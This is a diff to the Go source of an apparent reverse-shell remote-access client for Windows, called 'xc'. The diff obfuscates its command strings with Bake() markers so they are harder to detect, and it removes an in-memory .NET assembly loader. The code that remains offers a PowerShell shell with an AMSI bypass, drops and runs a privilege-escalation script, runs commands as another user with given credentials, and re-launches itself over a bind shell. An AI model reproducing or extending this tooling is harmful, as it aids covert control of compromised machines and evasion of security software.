@@ -6,17 +6,16 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
-	"log"
+	//"log"
 	"net"
 	"os"
-	"syscall"
+	//"syscall"
 	"time"
 
 	"../plugins"
 	"../shell"
 	"../utils"
 	"github.com/hashicorp/yamux"
-	"github.com/ropnop/go-clr"
 )
 
 var assemblies = make(map[string][]byte)
@@ -35,7 +34,7 @@ func Run(s *yamux.Session, c net.Conn) {
 	scanner := bufio.NewScanner(c)
 	homedir, err := os.UserHomeDir()
 	if err != nil {
-		homedir = "C:"
+		homedir = utils.Bake("§C:§")
 	}
 	// init
 	plugins.Init(c)
@@ -46,7 +45,7 @@ func Run(s *yamux.Session, c net.Conn) {
 			command := signalScanner.Text()
 			//fmt.Printf("Command %s\n", command)
 			switch command {
-			case "!sigint":
+			case utils.Bake("§!sigint§"):
 				if shellPipeReader != nil && shellPipeWriter != nil && shellCmd != nil {
 					//log.Println("Quitting shell (Ctrl+C)")
 					shellCmd.Process.Kill()
@@ -68,40 +67,38 @@ func Run(s *yamux.Session, c net.Conn) {
 			// commands that are shared between different os
 			help := usage()
 			help += "\n"
-			help += "  !powershell\n"
-			help += "    * starts powershell with AMSI Bypass\n"
-			help += "  !rc <port>\n"
-			help += "    * connects to a local bind shell and restarts this client over it\n"
-			help += "  !runasps <username> <password> <domain>\n"
-			help += "    * restart xc with the specified user using powershell\n"
-			help += "  !vulns\n"
-			help += "    * checks for common vulnerabilities\n"
-			help += "  !net <sample.exe> <arg1> <arg2> ...\n"
-			help += "    * Uploads & Runs a .NET assembly from memory\n"
+			help += utils.Bake("§  !powershell§")+ "\n"
+			help += utils.Bake("§    * starts powershell with AMSI Bypass§")+ "\n"
+			help += utils.Bake("§  !rc <port>§")+ "\n"
+			help += utils.Bake("§    * connects to a local bind shell and restarts this client over it§")+ "\n"
+			help += utils.Bake("§  !runasps <username> <password> <domain>§")+ "\n"
+			help += utils.Bake("§    * restart xc with the specified user using powershell§")+ "\n"
+			help += utils.Bake("§  !vulns\n§")
+			help += utils.Bake("§    * checks for common vulnerabilities§")+ "\n"
 
 			handled := handleSharedCommand(s, c, argv, help, homedir)
 			// os specific commands
 			if !handled {
 				switch argv[0] {
-				case "!vulns":
+				case utils.Bake("§!vulns§"):					
 					// we also run privesc check
-					privescCheck := "§privesccheck§"
-					path := "\\windows\\temp\\temp.ps1"
+					privescCheck := utils.Bake("§privesccheck§") // static replacement
+					path := utils.Bake(`§\windows\temp\rechteausweitung.ps1§`)
 					decodedScript, _ := base64.StdEncoding.DecodeString(privescCheck)
 					ioutil.WriteFile(path, []byte(decodedScript), 0644)
-					out, _ := shell.ExecPSOut(fmt.Sprintf(". %s;Invoke-PrivescCheck -Extended", path), false)
+					out, _ := shell.ExecPSOut(fmt.Sprintf(utils.Bake("§. %s;Invoke-PrivescCheck -Extended§"), path), false)
 					c.Write([]byte(out))
 					//vulns.Check(c)
 					os.Remove(path)
-					prompt(c)
-				case "!runasps":
+					prompt(c)					
+				case utils.Bake("§!runasps§"):
 					if len(argv) != 4 {
-						c.Write([]byte("Usage: !runas <username> <password> <domain>\n"))
+						c.Write([]byte("§Usage: !runas <username> <password> <domain>§"+ "\n"))
 					} else {
 						shell.RunAsPS(argv[1], argv[2], argv[3], c)
 					}
 					prompt(c)
-				case "!powershell":
+				case utils.Bake("§!powershell§"):
 					handled = true
 					//log.Println("Entering PowerShell")
 					shellCmd, _ = shell.Powershell()
@@ -114,7 +111,7 @@ func Run(s *yamux.Session, c net.Conn) {
 					shellCmd.Wait()
 					//log.Println("Exiting PowerShell (exit)")
 					prompt(c)
-				case "!rc":
+				case utils.Bake("§!rc§"):
 					if len(argv) == 2 {
 						rPort := argv[1]
 						lIP, lPort := utils.SplitAddress(c.RemoteAddr().String())
@@ -124,47 +121,9 @@ func Run(s *yamux.Session, c net.Conn) {
 							return
 						}
 					} else {
-						c.Write([]byte("Usage: !rc <port>\n"))
+						c.Write([]byte(utils.Bake("§Usage: !rc <port>§")+"\n"))
 					}
-					prompt(c)
-				case "!net":
-					// ToDo: Avoid the temporary file
-					if len(argv) >= 2 {
-						args := []string{}
-						if len(argv) > 2 {
-							args = argv[2:]
-						}
-						assemblyName := argv[1]
-						// cache loaded assemblies
-						if _, ok := assemblies[assemblyName]; !ok {
-							//fmt.Println("First time loading assembly, pulling from server")
-							assemblyBytes, _ := utils.UploadConnectRaw(s)
-							assemblies[assemblyName] = assemblyBytes
-						}
-						f, err := ioutil.TempFile("C:\\Windows\\temp", "xc")
-						if err != nil {
-							log.Fatal(err)
-						}
-						shell.SetStdHandle(syscall.STD_OUTPUT_HANDLE, syscall.Handle(f.Fd()))
-						oldStdout := os.Stdout
-						os.Stdout = f
-						// sometimes returns "0x80131604", eventually breaks - no idea why :( 
-						_, err = clr.ExecuteByteArray("v4", assemblies[assemblyName], args)
-						os.Stdout = oldStdout
-						out := []byte{}
-						if err != nil {
-							out = []byte(fmt.Sprintf("[Error] %s\n", err))
-						} else {
-							out, _ = ioutil.ReadFile(f.Name())
-						}
-						c.Write(out)
-						f.Close()
-						os.Remove(f.Name())
-
-					} else {
-						c.Write([]byte("!net <sample.exe> <arg1, arg2, ...>\n"))
-					}
-					prompt(c)
+					prompt(c)				
 				default:
 					shell.Exec(command, c)
 					prompt(c)
@@ -182,7 +141,7 @@ func rc(lIP string, lPort string, rPort string) error {
 		return err
 	}
 	path := shell.CopySelf()
-	cmd := fmt.Sprintf("c:\\windows\\system32\\cmd.exe /c %s %s %s\r\n", path, lIP, lPort)
+	cmd := fmt.Sprintf(utils.Bake("§c:\\windows\\system32\\cmd.exe /c§") + " %s %s %s\r\n", path, lIP, lPort)
 	conn.Write([]byte(cmd))
 	time.Sleep(5000 * time.Millisecond)
 	conn.Close()
